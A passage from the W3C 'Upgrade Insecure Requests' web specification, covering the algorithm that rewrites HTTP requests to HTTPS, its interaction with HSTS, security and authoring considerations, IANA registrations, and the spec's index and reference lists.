   1. request’s [URL](https://fetch.spec.whatwg.org/#concept-request-url) is not a [potentially trustworthy URL](https://w3c.github.io/webappsec-secure-contexts/#potentially-trustworthy-url)- request’s [URL](https://fetch.spec.whatwg.org/#concept-request-url)'s [host](https://url.spec.whatwg.org/#concept-url-host) is *not* a [preloadable HSTS host](#preloadable-hsts-host)

   Note: User agents can choose to append the [`Upgrade-Insecure-Requests` header field](#upgrade-insecure-requests-http-request-header-field) for other
   requests, as discussed in [§ 3.2.1 The Upgrade-Insecure-Requests HTTP Request Header Field](#preference).

   - If request is a [navigation request](https://fetch.spec.whatwg.org/#navigation-request), then:
     1. If request is a form submission, skip the remaining
        substeps, and continue upgrading request.- If request’s [client](https://fetch.spec.whatwg.org/#concept-request-client)'s [target browsing context](https://html.spec.whatwg.org/multipage/webappapis.html#concept-environment-target-browsing-context) is a [nested browsing context](https://html.spec.whatwg.org/multipage/browsers.html#nested-browsing-context), skip the remaining substeps
          and continue upgrading request.- Let tuple be a tuple of request’s [URL](https://fetch.spec.whatwg.org/#concept-request-url)'s [host](https://url.spec.whatwg.org/#concept-url-host) and [port](https://url.spec.whatwg.org/#concept-url-port).- If tuple is contained in [client](https://fetch.spec.whatwg.org/#concept-request-client)'s [upgrade insecure navigations set](#upgrade-insecure-navigations-set), then skip the remaining
              substeps, and continue upgrading request.- Return without further modifying request.

     Note: We only upgrade top-level [navigation requests](https://fetch.spec.whatwg.org/#navigation-request) for hosts
     that have explicitly opted-into the behavior for a particular [protected resource](https://www.w3.org/TR/CSP/#protected-resource), as described in [§ 1.2 Examples](#examples). Performing
     upgrades for top-level navigations to third-party resources brings a
     significantly higher potential for breakage, so we’re avoiding it for
     the moment. Nested navigations (via `[iframe](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-iframe-element)`, for example) affect
     the security status of their embedder, so we ensure that they are
     upgraded if necessary.

     - Let upgrade state be the result of executing [§ 4.2 Should insecure requests be upgraded for client?](#should-upgrade-for-client) upon request’s [client](https://fetch.spec.whatwg.org/#concept-request-client).- If upgrade state is [Do Not Upgrade](#valdef-insecure-requests-policy-do-not-upgrade), return without
         modifying request.- If request’s [URL](https://fetch.spec.whatwg.org/#concept-request-url)'s [scheme](https://url.spec.whatwg.org/#concept-url-scheme) is
           "`http`", set request’s [URL](https://fetch.spec.whatwg.org/#concept-request-url)'s [scheme](https://url.spec.whatwg.org/#concept-url-scheme) to "`https`", and return.

Note: Due to [[FETCH]](#biblio-fetch)'s recursive nature, this algorithm will upgrade
insecurely-redirected requests as well as insecure initial requests.

### 4.2. Should insecure [request](https://fetch.spec.whatwg.org/#concept-request)s be upgraded for client?

Given an [request](https://fetch.spec.whatwg.org/#concept-request)'s [client](https://fetch.spec.whatwg.org/#concept-request-client) client (an [environment settings object](https://html.spec.whatwg.org/multipage/webappapis.html#environment-settings-object)), this algorithm
returns `Enforced Upgrade` if insecure requests associated with
that client should be upgraded, or [Do Not Upgrade](#valdef-insecure-requests-policy-do-not-upgrade) otherwise. In
short, this will check the client and return the appropriate [insecure
requests policy](#insecure-requests-policy) set on it or its [browsing context](https://html.spec.whatwg.org/multipage/browsers.html#browsing-context).

1. If client has a [responsible document](https://html.spec.whatwg.org/multipage/webappapis.html#responsible-document), return the value
   of its [insecure requests policy](#insecure-requests-policy).

   Note: This catches `[Document](http://www.w3.org/TR/dom/#interface-document)`s or `[Worker](http://www.w3.org/TR/workers/#worker)`s whose policy is set
   directly by the `[upgrade-insecure-requests](#upgrade-insecure-requests)` directive,
   or which have inherited the policy from an [embedding document](https://w3c.github.io/webappsec-mixed-content/#embedding-document).

   - If client has a [responsible browsing context](https://html.spec.whatwg.org/multipage/webappapis.html#responsible-browsing-context), return the
     value of its [insecure requests policy](#insecure-requests-policy).

     Note: This catches requests triggered from detached [client](https://fetch.spec.whatwg.org/#concept-request-client)s. Not sure this is necessary, really,
     given the inheritance structure defined in [§ 3.3 Policy Inheritance](#nesting).

     - Return [Do Not Upgrade](#valdef-insecure-requests-policy-do-not-upgrade).

## 5. Security Considerations

### 5.1. Interaction with HSTS

The `[upgrade-insecure-requests](#upgrade-insecure-requests)` directive does not replace
the `[Strict-Transport-Security](https://tools.ietf.org/html/rfc6797#section-6.1)` HTTP response header [[RFC6797]](#biblio-rfc6797). Authors who serve their site over secure transport SHOULD send
that header with an appropriate `max-age` in order to ensure that
users are not subject to SSL stripping attacks by maliciously active network
attackers, or monitoring by maliciously passive network attackers.

### 5.2. CSP Violation Reports

When sending a violation report for an upgraded resource, user agents MUST
target the `[Document](http://www.w3.org/TR/dom/#interface-document)` or `[Worker](http://www.w3.org/TR/workers/#worker)` that triggered the request, rather
than the `[Document](http://www.w3.org/TR/dom/#interface-document)` or `[Worker](http://www.w3.org/TR/workers/#worker)` on which the `[upgrade-insecure-requests](#upgrade-insecure-requests)` directive was set. Due to [§ 3.3 Policy Inheritance](#nesting), the latter might be a cross-origin ancestor of the former, and
sending violation reports to that set of reporting endpoints could leak data
in unexpected ways.

Likewise, the `SecurityPolicyViolationEvent` MUST NOT target any `[Document](http://www.w3.org/TR/dom/#interface-document)` other than the one which triggered the request, for the same
reasons.

## 6. Performance Considerations

The upgrade mechanism specified here adds `Upgrade-Insecure-Requests:
1\r\n` to every outgoing [navigation request](https://fetch.spec.whatwg.org/#navigation-request) to non-[preloadable
HSTS hosts](#preloadable-hsts-host) (as discussed at length on public-webappsec@, and [w3c/webappsec#216](https://github.com/w3c/webappsec/issues/216)).
The advantages and intent of the header are laid out in [§ 3.2.1 The Upgrade-Insecure-Requests HTTP Request Header Field](#preference), and
though we’ve taken some steps to ensure that it won’t be a permanent fixture
of the platform (by carving out [preloadable HSTS hosts](#preloadable-hsts-host)), it’s going
to be a long, long time before the header vanishes.

User agents are encouraged to find additional carveouts, and implement them.

## 7. Authoring Considerations

### 7.1. Legacy Clients

Legacy clients which do support mixed content blocking [[MIX]](#biblio-mix), but do not
support the `[upgrade-insecure-requests](#upgrade-insecure-requests)` directive will
continue to have a suboptimal experience on pages containing insecure URLs.
Authors SHOULD ensure that they collect [violation reports](https://www.w3.org/TR/CSP/#send-violation-reports) in order to determine
which resources are most problematic for their users, and SHOULD use that
information to prioritize fixes for URLs in legacy content that users will
most likely request.

### 7.2. Relation to HSTS

The mechanism specified here deals only with the security policy for a
specific [protected resource](https://www.w3.org/TR/CSP/#protected-resource). It does not deprecate, replace, or in any
way reduce the value of the `Strict-Transport-Security` HTTP
response header [[RFC6797]](#biblio-rfc6797). Authors can and should continue to use that
header to ensure that their users are not subject to SSL stripping downgrade
attacks, as the `[upgrade-insecure-requests](#upgrade-insecure-requests)` directive will
not ensure that users visiting your site via links on third-party sites will
be upgraded to HTTPS for the top-level navigation.

Likewise, the `Strict-Transport-Security` header does not imply
the behavior that `[upgrade-insecure-requests](#upgrade-insecure-requests)` activates.
It only ensures that resources requested from an origin will never hit the
network insecurely.

We are intentionally keeping these concepts distinct, as authors may choose
to activate one or the other behavior, but ought not be forced to bind them
together.

## 8. IANA Considerations

### 8.1. Upgrade-Insecure-Requests Header

The permanent message header field registry should be updated
with the following registration: [[RFC3864]](#biblio-rfc3864)

Header field name
Upgrade-Insecure-Requests
Applicable protocol
http
Status
standard
Author/Change controller
W3C
Specification document
This specification (See [§ 3.2.1 The Upgrade-Insecure-Requests HTTP Request Header Field](#preference))
### 8.2. Upgrade-Insecure-Requests Directive

The Content Security Policy Directive registry should be updated with the
following registration: [[RFC7762]](#biblio-rfc7762)

Directive name
Upgrade-Insecure-Requests
Reference
This specification (See [§ 3.1 The upgrade-insecure-requests Content Security Policy directive](#delivery))

## 9. Acknowledgements

Anne van Kesteren helped ensure that the initial draft of this document was
sane. Peter Eckersley and Daniel Kahn Gillmor clarified the problem space, and
helped point out the impact.

## Index

### Terms defined by this specification

* [conditionally HSTS-safe](#conditionally-hsts-safe-origin), in § 2* [conditionally HSTS-safe origin](#conditionally-hsts-safe-origin), in § 2* [Do Not Upgrade](#valdef-insecure-requests-policy-do-not-upgrade), in § 3* [HSTS-safe](#hsts-safe-origin), in § 2* [HSTS-safe origin](#hsts-safe-origin), in § 2* [insecure requests policy](#insecure-requests-policy), in § 3* [preloadable HSTS host](#preloadable-hsts-host), in § 2* [safely upgradable](#safely-upgradable-requests), in § 2* [safely upgradable requests](#safely-upgradable-requests), in § 2* [Upgrade](#valdef-insecure-requests-policy-upgrade), in § 3* [upgrade a request](#upgrade-a-request), in § 2* [upgrade insecure navigations set](#upgrade-insecure-navigations-set), in § 3* [upgrade-insecure-requests](#upgrade-insecure-requests), in § 3.1* [Upgrade-Insecure-Requests header field](#upgrade-insecure-requests-http-request-header-field), in § 3.2.1* [Upgrade-Insecure-Requests HTTP request header field](#upgrade-insecure-requests-http-request-header-field), in § 3.2.1* [Upgrade request to a potentially trustworthy URL, if appropriate](#upgrade-request), in § 4

<https://tools.ietf.org/html/rfc5234#appendix-B.1>**Referenced in:**

* [3.2.1.
  The Upgrade-Insecure-Requests HTTP Request Header Field](#ref-for-appendix-B.1)  [(2)](#ref-for-appendix-B.1①)

<https://www.w3.org/TR/CSP/#content-security-policy>**Referenced in:**

* [1.2.1. Non-navigational Upgrades](#ref-for-content-security-policy)* [1.2.2. Navigational Upgrades](#ref-for-content-security-policy①)* [1.3. Recommendations](#ref-for-content-security-policy②) [(2)](#ref-for-content-security-policy③)* [3.1.
        The upgrade-insecure-requests Content Security Policy directive](#ref-for-content-security-policy④) * [3.4. Reporting Upgrades](#ref-for-content-security-policy⑤)

<https://www.w3.org/TR/CSP/#content-security-policy-report-only>**Referenced in:**

* [3.1.
  The upgrade-insecure-requests Content Security Policy directive](#ref-for-content-security-policy-report-only)  [(2)](#ref-for-content-security-policy-report-only①) [(3)](#ref-for-content-security-policy-report-only②)* [3.4. Reporting Upgrades](#ref-for-content-security-policy-report-only③)

<https://www.w3.org/TR/CSP/#default-src>**Referenced in:**

* [3.4. Reporting Upgrades](#ref-for-default-src) [(2)](#ref-for-default-src①)

<https://www.w3.org/TR/CSP/#enforce>**Referenced in:**

* [3.1.
  The upgrade-insecure-requests Content Security Policy directive](#ref-for-enforce) * [3.4. Reporting Upgrades](#ref-for-enforce①) [(2)](#ref-for-enforce②)

<https://www.w3.org/TR/CSP/#enforce>**Referenced in:**

* [3.1.
  The upgrade-insecure-requests Content Security Policy directive](#ref-for-enforce) * [3.4. Reporting Upgrades](#ref-for-enforce①) [(2)](#ref-for-enforce②)

<https://www.w3.org/TR/CSP/#monitor>**Referenced in:**

* [3.1.
  The upgrade-insecure-requests Content Security Policy directive](#ref-for-monitor) * [3.4. Reporting Upgrades](#ref-for-monitor①) [(2)](#ref-for-monitor②)

<https://www.w3.org/TR/CSP/#monitor>**Referenced in:**

* [3.1.
  The upgrade-insecure-requests Content Security Policy directive](#ref-for-monitor) * [3.4. Reporting Upgrades](#ref-for-monitor①) [(2)](#ref-for-monitor②)

<https://www.w3.org/TR/CSP/#protected-resource>**Referenced in:**

* [3.1.
  The upgrade-insecure-requests Content Security Policy directive](#ref-for-protected-resource)  [(2)](#ref-for-protected-resource①) [(3)](#ref-for-protected-resource②)* [3.4. Reporting Upgrades](#ref-for-protected-resource③)* [4.1.
      Upgrade request to a potentially trustworthy URL, if appropriate](#ref-for-protected-resource④) * [7.2. Relation to HSTS](#ref-for-protected-resource⑤)

<https://www.w3.org/TR/CSP/#report-uri>**Referenced in:**

* [3.4. Reporting Upgrades](#ref-for-report-uri)

<https://www.w3.org/TR/CSP/#send-violation-reports>**Referenced in:**

* [7.1. Legacy Clients](#ref-for-send-violation-reports)

<https://www.w3.org/TR/CSP/#example-violation-report>**Referenced in:**

* [3.4. Reporting Upgrades](#ref-for-example-violation-report)

<http://www.w3.org/TR/dom/#interface-document>**Referenced in:**

* [3.3. Policy Inheritance](#ref-for-interface-document)* [4.2.
    Should insecure requests be upgraded for client?](#ref-for-interface-document①) * [5.2. CSP Violation Reports](#ref-for-interface-document②) [(2)](#ref-for-interface-document③) [(3)](#ref-for-interface-document④)

<https://fetch.spec.whatwg.org/#concept-header-list-append>**Referenced in:**

* [4.1.
  Upgrade request to a potentially trustworthy URL, if appropriate](#ref-for-concept-header-list-append)

<https://fetch.spec.whatwg.org/#concept-request-client>**Referenced in:**

* [4.1.
  Upgrade request to a potentially trustworthy URL, if appropriate](#ref-for-concept-request-client)  [(2)](#ref-for-concept-request-client①) [(3)](#ref-for-concept-request-client②) [(4)](#ref-for-concept-request-client③)* [4.2.
    Should insecure requests be upgraded for client?](#ref-for-concept-request-client④)  [(2)](#ref-for-concept-request-client⑤)

<https://fetch.spec.whatwg.org/#concept-fetch>**Referenced in:**

* [3. Upgrading Insecure Resource Requests](#ref-for-concept-fetch)* [3.1.1. Relation to "Mixed Content"](#ref-for-concept-fetch①)

<https://fetch.spec.whatwg.org/#concept-request-header-list>**Referenced in:**

* [2. Key Concepts and Terminology](#ref-for-concept-request-header-list)* [4.1.
    Upgrade request to a potentially trustworthy URL, if appropriate](#ref-for-concept-request-header-list①)

<https://fetch.spec.whatwg.org/#main-fetch>**Referenced in:**

* [4.1.
  Upgrade request to a potentially trustworthy URL, if appropriate](#ref-for-main-fetch)

<https://fetch.spec.whatwg.org/#navigation-request>**Referenced in:**

* [3. Upgrading Insecure Resource Requests](#ref-for-navigation-request)* [3.2. Feature Detecting Clients Capable of Upgrading](#ref-for-navigation-request①)* [4.1.
      Upgrade request to a potentially trustworthy URL, if appropriate](#ref-for-navigation-request②)  [(2)](#ref-for-navigation-request③) [(3)](#ref-for-navigation-request④) [(4)](#ref-for-navigation-request⑤) [(5)](#ref-for-navigation-request⑥)* [6. Performance Considerations](#ref-for-navigation-request⑦)

<https://fetch.spec.whatwg.org/#concept-request>**Referenced in:**

* [2. Key Concepts and Terminology](#ref-for-concept-request) [(2)](#ref-for-concept-request①) [(3)](#ref-for-concept-request②)* [3.2. Feature Detecting Clients Capable of Upgrading](#ref-for-concept-request③)* [3.2.1.
      The Upgrade-Insecure-Requests HTTP Request Header Field](#ref-for-concept-request④)  [(2)](#ref-for-concept-request⑤) [(3)](#ref-for-concept-request⑥)* [3.4. Reporting Upgrades](#ref-for-concept-request⑦)* [4.1.
          Upgrade request to a potentially trustworthy URL, if appropriate](#ref-for-concept-request⑧) * [4.2.
            Should insecure requests be upgraded for client?](#ref-for-concept-request⑨)  [(2)](#ref-for-concept-request①⓪)

<https://fetch.spec.whatwg.org/#concept-request-url>**Referenced in:**

* [3.2.1.
  The Upgrade-Insecure-Requests HTTP Request Header Field](#ref-for-concept-request-url)  [(2)](#ref-for-concept-request-url①)* [4.1.
    Upgrade request to a potentially trustworthy URL, if appropriate](#ref-for-concept-request-url②)  [(2)](#ref-for-concept-request-url③) [(3)](#ref-for-concept-request-url④) [(4)](#ref-for-concept-request-url⑤) [(5)](#ref-for-concept-request-url⑥) [(6)](#ref-for-concept-request-url⑦)

<https://html.spec.whatwg.org/multipage/browsers.html#browsing-context>**Referenced in:**

* [3. Upgrading Insecure Resource Requests](#ref-for-browsing-context) [(2)](#ref-for-browsing-context①)* [3.3. Policy Inheritance](#ref-for-browsing-context②)* [4.2.
      Should insecure requests be upgraded for client?](#ref-for-browsing-context③)

<https://html.spec.whatwg.org/multipage/browsers.html#create-a-document-object>**Referenced in:**

* [3.3. Policy Inheritance](#ref-for-create-a-document-object)

<https://html.spec.whatwg.org/multipage/webappapis.html#environment-settings-object>**Referenced in:**

* [3. Upgrading Insecure Resource Requests](#ref-for-environment-settings-object) [(2)](#ref-for-environment-settings-object①)* [4.2.
    Should insecure requests be upgraded for client?](#ref-for-environment-settings-object②)

<https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-iframe-element>**Referenced in:**

* [4.1.
  Upgrade request to a potentially trustworthy URL, if appropriate](#ref-for-the-iframe-element)

<https://html.spec.whatwg.org/multipage/webappapis.html#incumbent-settings-object>**Referenced in:**

* [3.1.
  The upgrade-insecure-requests Content Security Policy directive](#ref-for-incumbent-settings-object) * [3.3. Policy Inheritance](#ref-for-incumbent-settings-object①) [(2)](#ref-for-incumbent-settings-object②)

<https://html.spec.whatwg.org/multipage/browsers.html#nested-browsing-context>**Referenced in:**

* [3.3. Policy Inheritance](#ref-for-nested-browsing-context) [(2)](#ref-for-nested-browsing-context①)* [4.1.
    Upgrade request to a potentially trustworthy URL, if appropriate](#ref-for-nested-browsing-context②)

<https://html.spec.whatwg.org/multipage/webappapis.html#responsible-browsing-context>**Referenced in:**

* [4.2.
  Should insecure requests be upgraded for client?](#ref-for-responsible-browsing-context)

<https://html.spec.whatwg.org/multipage/webappapis.html#responsible-document>**Referenced in:**

* [4.2.
  Should insecure requests be upgraded for client?](#ref-for-responsible-document)

<https://html.spec.whatwg.org/multipage/webappapis.html#concept-environment-target-browsing-context>**Referenced in:**

* [4.1.
  Upgrade request to a potentially trustworthy URL, if appropriate](#ref-for-concept-environment-target-browsing-context)

<https://w3c.github.io/webappsec/specs/mixedcontent/#block-all-mixed-content>**Referenced in:**

* [1.3. Recommendations](#ref-for-block-all-mixed-content)* [3.1.1. Relation to "Mixed Content"](#ref-for-block-all-mixed-content①)

<https://w3c.github.io/webappsec-mixed-content/#embedding-document>**Referenced in:**

* [3.3. Policy Inheritance](#ref-for-embedding-document) [(2)](#ref-for-embedding-document①)* [4.2.
    Should insecure requests be upgraded for client?](#ref-for-embedding-document②)

<https://w3c.github.io/webappsec/specs/mixedcontent/#strict-mode>**Referenced in:**

* [1.1. Goals](#ref-for-strict-mode)* [1.3. Recommendations](#ref-for-strict-mode①)

<https://tools.ietf.org/html/rfc6454#section-3.2>**Referenced in:**

* [2. Key Concepts and Terminology](#ref-for-section-3.2) [(2)](#ref-for-section-3.2①)

<https://tools.ietf.org/html/rfc6797#section-8.2>**Referenced in:**

* [2. Key Concepts and Terminology](#ref-for-section-8.2) [(2)](#ref-for-section-8.2①) [(3)](#ref-for-section-8.2②)

<https://tools.ietf.org/html/rfc6797#section-6.1.2>**Referenced in:**

* [2. Key Concepts and Terminology](#ref-for-section-6.1.2)

<https://tools.ietf.org/html/rfc6797#section-8.1.1>**Referenced in:**

* [2. Key Concepts and Terminology](#ref-for-section-8.1.1) [(2)](#ref-for-section-8.1.1①)

<https://tools.ietf.org/html/rfc6797#section-8.2>**Referenced in:**

* [2. Key Concepts and Terminology](#ref-for-section-8.2) [(2)](#ref-for-section-8.2①) [(3)](#ref-for-section-8.2②)

<https://tools.ietf.org/html/rfc6797#section-6.1>**Referenced in:**

* [1.3. Recommendations](#ref-for-section-6.1) [(2)](#ref-for-section-6.1①) [(3)](#ref-for-section-6.1②)* [2. Key Concepts and Terminology](#ref-for-section-6.1③) [(2)](#ref-for-section-6.1④) [(3)](#ref-for-section-6.1⑤)* [3.2. Feature Detecting Clients Capable of Upgrading](#ref-for-section-6.1⑥)* [3.2.1.
        The Upgrade-Insecure-Requests HTTP Request Header Field](#ref-for-section-6.1⑦) * [5.1. Interaction with HSTS](#ref-for-section-6.1⑧)

<https://tools.ietf.org/html/rfc6797#section-8.2>**Referenced in:**

* [2. Key Concepts and Terminology](#ref-for-section-8.2) [(2)](#ref-for-section-8.2①) [(3)](#ref-for-section-8.2②)

<https://tools.ietf.org/html/rfc7231#section-3>**Referenced in:**

* [2. Key Concepts and Terminology](#ref-for-section-3) [(2)](#ref-for-section-3①) [(3)](#ref-for-section-3②) [(4)](#ref-for-section-3③) [(5)](#ref-for-section-3④)

<https://tools.ietf.org/html/rfc7231#section-7.1.4>**Referenced in:**

* [3.2.1.
  The Upgrade-Insecure-Requests HTTP Request Header Field](#ref-for-section-7.1.4)  [(2)](#ref-for-section-7.1.4①)

<https://tools.ietf.org/html/rfc7234#section-5.2>**Referenced in:**

* [3.2.1.
  The Upgrade-Insecure-Requests HTTP Request Header Field](#ref-for-section-5.2)  [(2)](#ref-for-section-5.2①)

<https://tools.ietf.org/html/rfc7234#section-5.2.2.3>**Referenced in:**

* [3.2.1.
  The Upgrade-Insecure-Requests HTTP Request Header Field](#ref-for-section-5.2.2.3)

<https://tools.ietf.org/html/rfc7240#section-2>**Referenced in:**

* [3.2.1.
  The Upgrade-Insecure-Requests HTTP Request Header Field](#ref-for-section-2)

<https://w3c.github.io/webappsec-secure-contexts/#potentially-trustworthy-url>**Referenced in:**

* [1.3. Recommendations](#ref-for-potentially-trustworthy-url)* [3. Upgrading Insecure Resource Requests](#ref-for-potentially-trustworthy-url①)* [3.2.1.
      The Upgrade-Insecure-Requests HTTP Request Header Field](#ref-for-potentially-trustworthy-url②)  [(2)](#ref-for-potentially-trustworthy-url③) [(3)](#ref-for-potentially-trustworthy-url④)* [4.1.
        Upgrade request to a potentially trustworthy URL, if appropriate](#ref-for-potentially-trustworthy-url⑤)  [(2)](#ref-for-potentially-trustworthy-url⑥)

<https://url.spec.whatwg.org/#concept-url-host>**Referenced in:**

* [1.1. Goals](#ref-for-concept-url-host)* [2. Key Concepts and Terminology](#ref-for-concept-url-host①)* [3. Upgrading Insecure Resource Requests](#ref-for-concept-url-host②)* [3.1.
        The upgrade-insecure-requests Content Security Policy directive](#ref-for-concept-url-host③) * [3.2.1.
          The Upgrade-Insecure-Requests HTTP Request Header Field](#ref-for-concept-url-host④)  [(2)](#ref-for-concept-url-host⑤) [(3)](#ref-for-concept-url-host⑥)* [4.1.
            Upgrade request to a potentially trustworthy URL, if appropriate](#ref-for-concept-url-host⑦)  [(2)](#ref-for-concept-url-host⑧)

<https://url.spec.whatwg.org/#concept-url-path>**Referenced in:**

* [1.1. Goals](#ref-for-concept-url-path)

<https://url.spec.whatwg.org/#concept-url-port>**Referenced in:**

* [3. Upgrading Insecure Resource Requests](#ref-for-concept-url-port)* [3.1.
    The upgrade-insecure-requests Content Security Policy directive](#ref-for-concept-url-port①) * [4.1.
      Upgrade request to a potentially trustworthy URL, if appropriate](#ref-for-concept-url-port②)

<https://url.spec.whatwg.org/#concept-url-scheme>**Referenced in:**

* [1.1. Goals](#ref-for-concept-url-scheme)* [2. Key Concepts and Terminology](#ref-for-concept-url-scheme①)* [4.1.
      Upgrade request to a potentially trustworthy URL, if appropriate](#ref-for-concept-url-scheme②)  [(2)](#ref-for-concept-url-scheme③)

<https://url.spec.whatwg.org/#concept-url>**Referenced in:**

* [3.1.
  The upgrade-insecure-requests Content Security Policy directive](#ref-for-concept-url)

<http://www.w3.org/TR/workers/#worker>**Referenced in:**

* [4.2.
  Should insecure requests be upgraded for client?](#ref-for-worker) * [5.2. CSP Violation Reports](#ref-for-worker①) [(2)](#ref-for-worker②)

<http://www.w3.org/TR/workers/#script-settings-for-workers>**Referenced in:**

* [3.3. Policy Inheritance](#ref-for-script-settings-for-workers)
### Terms defined by reference

* [ABNF] defines the following terms:
  + wsp* [CSP] defines the following terms:
    + content-security-policy+ content-security-policy-report-only+ default-src+ enforce+ enforced+ monitor+ monitored+ protected resource+ report-uri+ send violation reports+ violation report* [DOM] defines the following terms:
      + Document* [FETCH] defines the following terms:
        + append+ client+ fetch+ header list+ main fetch+ navigation request+ request+ url* [HTML] defines the following terms:
          + browsing context+ creating a new document object+ environment settings object+ iframe+ incumbent settings object+ nested browsing context+ responsible browsing context+ responsible document+ target browsing context* [MIX] defines the following terms:
            + block-all-mixed-content+ embedding document+ strict mode* [RFC6454] defines the following terms:
              + origin* [RFC6797] defines the following terms:
                + congruent match+ includesubdomains+ known hsts host+ known hsts host domain name matching+ strict-transport-security+ superdomain match* [RFC7231] defines the following terms:
                  + resource representation+ vary* [RFC7234] defines the following terms:
                    + cache-control+ no-store* [RFC7240] defines the following terms:
                      + prefer* [SECURE-CONTEXTS] defines the following terms:
                        + potentially trustworthy url* [URL] defines the following terms:
                          + host+ path+ port+ scheme+ url* [WORKERS] defines the following terms:
                            + Worker+ set up a worker environment settings object

## References

### Normative References

[ABNF]
D. Crocker, Ed.; P. Overell. [Augmented BNF for Syntax Specifications: ABNF](https://www.rfc-editor.org/rfc/rfc5234). January 2008. Internet Standard. URL: <https://www.rfc-editor.org/rfc/rfc5234>
[CSP]
Mike West; Adam Barth; Dan Veditz. [Content Security Policy](https://www.w3.org/TR/CSP/). CR. URL: <https://www.w3.org/TR/CSP/>
[DOM]
Anne van Kesteren. [DOM Standard](https://dom.spec.whatwg.org/). Living Standard. URL: <https://dom.spec.whatwg.org/>
[FETCH]
Anne van Kesteren. [Fetch Standard](https://fetch.spec.whatwg.org/). Living Standard. URL: <https://fetch.spec.whatwg.org/>
[HTML]
Anne van Kesteren; et al. [HTML Standard](https://html.spec.whatwg.org/multipage/). Living Standard. URL: <https://html.spec.whatwg.org/multipage/>
[MIX]
Emily Stark; Mike West; Carlos IbarraLopez. [Mixed Content](https://w3c.github.io/webappsec-mixed-content/). URL: <https://w3c.github.io/webappsec-mixed-content/>
[RFC3864]
G. Klyne; M. Nottingham; J. Mogul. [Registration Procedures for Message Header Fields](https://www.rfc-editor.org/rfc/rfc3864). September 2004. Best Current Practice. URL: <https://www.rfc-editor.org/rfc/rfc3864>
[RFC6454]
A. Barth. [The Web Origin Concept](https://www.rfc-editor.org/rfc/rfc6454). December 2011. Proposed Standard. URL: <https://www.rfc-editor.org/rfc/rfc6454>
[RFC6797]
J. Hodges; C. Jackson; A. Barth. [HTTP Strict Transport Security (HSTS)](https://www.rfc-editor.org/rfc/rfc6797). November 2012. Proposed Standard. URL: <https://www.rfc-editor.org/rfc/rfc6797>
[RFC7231]
R. Fielding, Ed.; J. Reschke, Ed.. [Hypertext Transfer Protocol (HTTP/1.1): Semantics and Content](https://httpwg.org/specs/rfc7231.html). June 2014. Proposed Standard. URL: <https://httpwg.org/specs/rfc7231.html>
[RFC7762]
M. West. [Initial Assignment for the Content Security Policy Directives Registry](https://www.rfc-editor.org/rfc/rfc7762). January 2016. Informational. URL: <https://www.rfc-editor.org/rfc/rfc7762>
[SECURE-CONTEXTS]
Mike West. [Secure Contexts](https://w3c.github.io/webappsec-secure-contexts/). URL: <https://w3c.github.io/webappsec-secure-contexts/>
[URL]
Anne van Kesteren. [URL Standard](https://url.spec.whatwg.org/). Living Standard. URL: <https://url.spec.whatwg.org/>
[WORKERS]
Ian Hickson. [Web Workers](http://www.w3.org/TR/workers/). WD. URL: <http://www.w3.org/TR/workers/>
### Informative References

[BBC-ARCHIVE]
Neil McIntosh. [Labelling BBC Online's archived websites](http://www.bbc.co.uk/blogs/internet/entries/f7126d19-2afa-3231-9c4e-0f7198c468ab). URL: <http://www.bbc.co.uk/blogs/internet/entries/f7126d19-2afa-3231-9c4e-0f7198c468ab>
[NYT-HTTPS]
Eitan Konigsburg; Rajiv Pant; Elena Kvochko. [Embracing HTTPS](http://open.blogs.nytimes.com/2014/11/13/embracing-https/). URL: [http://open.blogs.nytimes.com/2014/11/1%33/embracing-https/](http://open.blogs.nytimes.com/2014/11/13/embracing-https/)
[RFC7234]
R. Fielding, Ed.; M. Nottingham, Ed.; J. Reschke, Ed.. [Hypertext Transfer Protocol (HTTP/1.1): Caching](https://httpwg.org/specs/rfc7234.html). June 2014. Proposed Standard. URL: <https://httpwg.org/specs/rfc7234.html>
[RFC7240]
J. Snell. [Prefer Header for HTTP](https://www.rfc-editor.org/rfc/rfc7240). June 2014. Proposed Standard. URL: <https://www.rfc-editor.org/rfc/rfc7240>
[WEB-HTTPS]
Mark Nottingham. [Securing the Web](http://www.w3.org/2001/tag/doc/web-https). TAG Finding. URL: <http://www.w3.org/2001/tag/doc/web-https>

**<#safely-upgradable-requests>****Referenced in:**

* [1.3. Recommendations](#ref-for-safely-upgradable-requests) [(2)](#ref-for-safely-upgradable-requests①) [(3)](#ref-for-safely-upgradable-requests②)

**<#hsts-safe-origin>****Referenced in:**

* [1.3. Recommendations](#ref-for-hsts-safe-origin)* [2. Key Concepts and Terminology](#ref-for-hsts-safe-origin①)* [3.2.1.
      The Upgrade-Insecure-Requests HTTP Request Header Field](#ref-for-hsts-safe-origin②)  [(2)](#ref-for-hsts-safe-origin③)

**<#conditionally-hsts-safe-origin>****Referenced in:**

* [1.3. Recommendations](#ref-for-conditionally-hsts-safe-origin)* [2. Key Concepts and Terminology](#ref-for-conditionally-hsts-safe-origin①)* [3.2. Feature Detecting Clients Capable of Upgrading](#ref-for-conditionally-hsts-safe-origin②)* [3.2.1.
        The Upgrade-Insecure-Requests HTTP Request Header Field](#ref-for-conditionally-hsts-safe-origin③)

**<#preloadable-hsts-host>****Referenced in:**

* [3.2.1.
  The Upgrade-Insecure-Requests HTTP Request Header Field](#ref-for-preloadable-hsts-host)  [(2)](#ref-for-preloadable-hsts-host①) [(3)](#ref-for-preloadable-hsts-host②)* [4.1.
    Upgrade request to a potentially trustworthy URL, if appropriate](#ref-for-preloadable-hsts-host③) * [6. Performance Considerations](#ref-for-preloadable-hsts-host④) [(2)](#ref-for-preloadable-hsts-host⑤)

**<#insecure-requests-policy>****Referenced in:**

* [3.1.
  The upgrade-insecure-requests Content Security Policy directive](#ref-for-insecure-requests-policy) * [3.3. Policy Inheritance](#ref-for-insecure-requests-policy①) [(2)](#ref-for-insecure-requests-policy②) [(3)](#ref-for-insecure-requests-policy③) [(4)](#ref-for-insecure-requests-policy④) [(5)](#ref-for-insecure-requests-policy⑤) [(6)](#ref-for-insecure-requests-policy⑥) [(7)](#ref-for-insecure-requests-policy⑦)* [4.2.
      Should insecure requests be upgraded for client?](#ref-for-insecure-requests-policy⑧)  [(2)](#ref-for-insecure-requests-policy⑨) [(3)](#ref-for-insecure-requests-policy①⓪)

**<#valdef-insecure-requests-policy-do-not-upgrade>****Referenced in:**

* [3. Upgrading Insecure Resource Requests](#ref-for-valdef-insecure-requests-policy-do-not-upgrade)* [4.1.
    Upgrade request to a potentially trustworthy URL, if appropriate](#ref-for-valdef-insecure-requests-policy-do-not-upgrade①) * [4.2.
